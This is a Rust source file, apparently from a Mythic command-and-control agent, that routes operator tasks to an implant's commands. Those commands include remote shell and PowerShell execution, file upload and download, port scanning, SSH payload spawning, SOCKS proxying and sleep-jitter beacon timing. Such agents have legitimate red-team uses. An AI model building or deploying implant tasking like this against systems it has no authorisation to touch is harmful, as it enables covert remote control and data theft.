use crate::agent;
use crate::mythic_error;
use std::collections::VecDeque;
use std::error::Error;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    mpsc, Arc,
};

// Import all of the commands
use crate::{
    cat, cd, cp, download, exit, getenv, getprivs, jobs, ls, mkdir, mv, portscan, ps, pwd,
    redirect, rm, setenv, shell, sleep, ssh, unsetenv, upload, workinghours,
};

#[cfg(feature = "socks")]
use crate::socks::task_socks;

/// Struct which holds the information about background jobs
#[derive(Debug)]
pub struct BackgroundTask {
    /// Command used to spawn the background task
    pub command: String,

    /// Parameters passed to the background task
    pub parameters: String,

    /// Job id of the background task
    pub id: u32,

    /// Flag indicating if the background task should be running
    pub running: Arc<AtomicBool>,

    /// Flag indicating if this background task is designed to be manually killed
    pub killable: bool,

    /// Task id from Mythic associated with background task
    pub uuid: String,

    /// Channel for sending information from the worker thread to the background task
    tx: mpsc::Sender<serde_json::Value>,

    /// Channel for receiving information from the background task
    rx: mpsc::Receiver<serde_json::Value>,
}

/// Struct for handling tasking
#[derive(Debug)]
pub struct Tasker {
    /// List of running background tasks
    pub background_tasks: Vec<BackgroundTask>,

    /// List of all completed task messages
    completed_tasks: Vec<serde_json::Value>,

    /// Value used handing out job ids to new jobs
    dispatch_val: u32,

    /// Cache for storing job ids which were used but the task is finished
    cached_ids: VecDeque<u32>,
}

/// Prototype for background task callback functions
type SpawnCbType = fn(
    &mpsc::Sender<serde_json::Value>,
    mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>>;

impl Tasker {
    /// Create a new tasker
    pub fn new() -> Self {
        Self {
            background_tasks: Vec::new(),
            completed_tasks: Vec::new(),
            dispatch_val: 0,
            cached_ids: VecDeque::new(),
        }
    }

    /// Process the pending tasks
    /// * `tasks` - Tasks needing to be processed
    /// * `agent` - Reference to the shared data of the agent
    pub fn process_tasks(
        &mut self,
        tasks: Option<&Vec<agent::AgentTask>>,
        agent: &mut agent::SharedData,
    ) -> Result<(), Box<dyn Error>> {
        // Iterate over each pending task
        if let Some(tasks) = tasks {
            for task in tasks.iter() {
                // Process tasks which are either background tasks or tasks where messages
                // need to be sent to an already running background task.
                match task.command.as_str() {
                    "download" => {
                        if let Err(e) = self.spawn_background(task, download::download_file, false)
                        {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "portscan" => {
                        if let Err(e) = self.spawn_background(task, portscan::scan_ports, true) {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()))
                        }
                        continue;
                    }

                    #[cfg(target_os = "windows")]
                    "powershell" => {
                        if let Err(e) = self.spawn_background(task, shell::run_powershell, false) {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "redirect" => {
                        if let Err(e) = self.spawn_background(task, redirect::setup_redirect, true)
                        {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "ssh-spawn" => {
                        if let Err(e) =
                            self.spawn_background(task, ssh::spawn::spawn_payload, false)
                        {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "ssh" => {
                        if let Err(e) = self.spawn_background(task, ssh::run_ssh, false) {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "shell" => {
                        if let Err(e) = self.spawn_background(task, shell::run_cmd, false) {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "upload" => {
                        if let Err(e) = self.spawn_background(task, upload::upload_file, false) {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "jobkill" => {
                        match jobs::kill_job(task, &self.background_tasks) {
                            Ok(res) => {
                                for msg in res {
                                    self.completed_tasks.push(msg);
                                }
                            }
                            Err(e) => self
                                .completed_tasks
                                .push(mythic_error!(task.id, e.to_string())),
                        }
                        continue;
                    }

                    #[cfg(feature = "socks")]
                    "socks" => {
                        match task_socks(task.parameters.as_str(),
                            task.id.clone(),
                            &mut agent.socks_from_backend,
                            &mut agent.socks_to_backend) {
                            Ok(Some((running, tx, rx))) => {
                                // Assign a new ID to the job
                                let id = if let Some(id) = self.cached_ids.pop_front() {
                                    id
                                } else {
                                    self.dispatch_val += 1;
                                    self.dispatch_val - 1
                                };
                                self.background_tasks.push(BackgroundTask {
                                    command: "socks".into(),
                                    parameters: task.parameters.clone(),
                                    uuid: task.id.clone(),
                                    killable: true,
                                    id,
                                    running,
                    
                                    tx,
                                    rx,
                                });
                            },
                            Ok(None) => {

                            },
                            Err(e) => {
                                self.completed_tasks
                                    .push(mythic_error!(task.id, e.to_string()));
                            }
                        }
                        continue;
                    }

                    // This is used if messages need to be sent to an already running background
                    // task.
                    "continued_task" => {
                        for job in &self.background_tasks {
                            if task.id == job.uuid {
                                let msg = match serde_json::to_value(task) {
                                    Ok(m) => m,
                                    Err(e) => {
                                        self.completed_tasks
                                            .push(mythic_error!(task.id, e.to_string()));
                                        break;
                                    }
                                };
                                if let Err(e) = job.tx.send(msg) {
                                    self.completed_tasks
                                        .push(mythic_error!(task.id, e.to_string()));
                                }
                                break;
                            }
                        }
                        continue;
                    }

                    _ => (),
                };

                // Process any special task which requires shared data
                self.completed_tasks.push(match task.command.as_str() {
                    // Check for special tasks which require other information
                    "sleep" => {
                        match sleep::set_sleep(task, &mut agent.sleep_interval, &mut agent.jitter) {
                            Ok(res) => res,
                            Err(e) => mythic_error!(task.id, e.to_string()),
                        }
                    }
                    "exit" => exit::exit_agent(task, &mut agent.exit_agent),
                    "jobs" => jobs::list_jobs(task, &self.background_tasks),
                    "workinghours" => match workinghours::working_hours(task, agent) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    // If the task is not a special task or backgorund task then
                    // just process it like normal
                    _ => process_task(task),
                });
            }
        }
        Ok(())
    }

    pub fn get_completed_tasks(&mut self) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
        // Create the completed task information list
        let mut completed_tasks: Vec<serde_json::Value> = Vec::new();

        // Iterate over running background jobs
        for task in self.background_tasks.iter() {
            // Check if a background job has any messages to send up to Mythic and add
            // them to the completed_tasks Vec
            while let Ok(msg) = task.rx.try_recv() {
                completed_tasks.push(msg);
            }

            // Check if the background task is still running.
            if !task.running.load(Ordering::SeqCst) || Arc::strong_count(&task.running) == 1 {
                // If the task is marked as ended, grab all of the messages from the channel queue
                while let Ok(msg) = task.rx.try_recv() {
                    completed_tasks.push(msg);
                }

                task.running.store(false, Ordering::SeqCst);
                self.cached_ids.push_back(task.id);
            }
        }

        // Filter out any background tasks which are not running
        self.background_tasks
            .retain(|x| x.running.load(Ordering::SeqCst));

        completed_tasks.append(&mut self.completed_tasks);

        Ok(completed_tasks)
    }

    /// Spawn the task but in a new thread. This will set up the necessary tracking information
    /// and means of communication.
    /// spawn_background takes a callback function which is the function that will run in
    /// its own thread.
    ///
    /// Arguments:
    /// * `task` - The task being spawned
    /// * `callback` - Callback function for completing the task
    /// * `killable` - `false` returns an error in Mythic if the task is manually killed
    fn spawn_background(
        &mut self,
        task: &agent::AgentTask,
        callback: SpawnCbType,
        killable: bool,
    ) -> Result<(), Box<dyn Error>> {
        // Set up channels for communication
        let (tasker_tx, job_rx) = mpsc::channel();
        let (job_tx, tasker_rx) = mpsc::channel();

        // Assign a new ID to the job
        let id = if let Some(id) = self.cached_ids.pop_front() {
            id
        } else {
            self.dispatch_val += 1;
            self.dispatch_val - 1
        };

        // Create a new flag indicating that the task is running
        let running = Arc::new(AtomicBool::new(true));
        let running_ref = running.clone();

        let uuid = task.id.clone();

        // Spawn a new thread for the background task
        std::thread::spawn(move || {
            // Invoke the callback function
            if let Err(e) = callback(&job_tx, job_rx) {
                // If the function returns an error, relay the error message back to Mythic
                let _ = job_tx.send(mythic_error!(uuid, e.to_string()));
            }
            // Once the task ends, mark it as not running
            running_ref.store(false, Ordering::SeqCst);
        });

        // After the new thread for the task is spawned, pass along the inital message
        tasker_tx.send(serde_json::to_value(task)?)?;

        // Append this new task to the Vec of background tasks
        self.background_tasks.push(BackgroundTask {
            command: task.command.clone(),
            parameters: task.parameters.clone(),
            uuid: task.id.clone(),
            killable,
            id,
            running,

            tx: tasker_tx,
            rx: tasker_rx,
        });
        Ok(())
    }
}

/// Process a single task in the current thread
/// * `task` - Task to process
fn process_task(task: &agent::AgentTask) -> serde_json::Value {
    // Check which task to execute and run the necessary function including error
    // handling
    match task.command.as_str() {
        "cat" => match cat::cat_file(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "cd" => match cd::change_dir(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "cp" => match cp::copy_file(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "getenv" => match getenv::get_env(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "getprivs" => match getprivs::get_privileges(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "ls" => match ls::make_ls(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "mkdir" => match mkdir::make_directory(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "mv" => match mv::move_file(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "ps" => match ps::get_process_list(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "pwd" => match pwd::get_pwd(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "rm" => match rm::remove(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "setenv" => match setenv::set_env(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "ssh-agent" => match ssh::agent::ssh_agent(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        "unsetenv" => match unsetenv::unset_env(task) {
            Ok(res) => res,
            Err(e) => mythic_error!(task.id, e.to_string()),
        },

        // If the task command is not found relay that back up to Mythic
        _ => mythic_error!(
            task.id,
            format!(
                "Command '{}' not found or implemented",
                task.command.as_str()
            )
        ),
    }
}
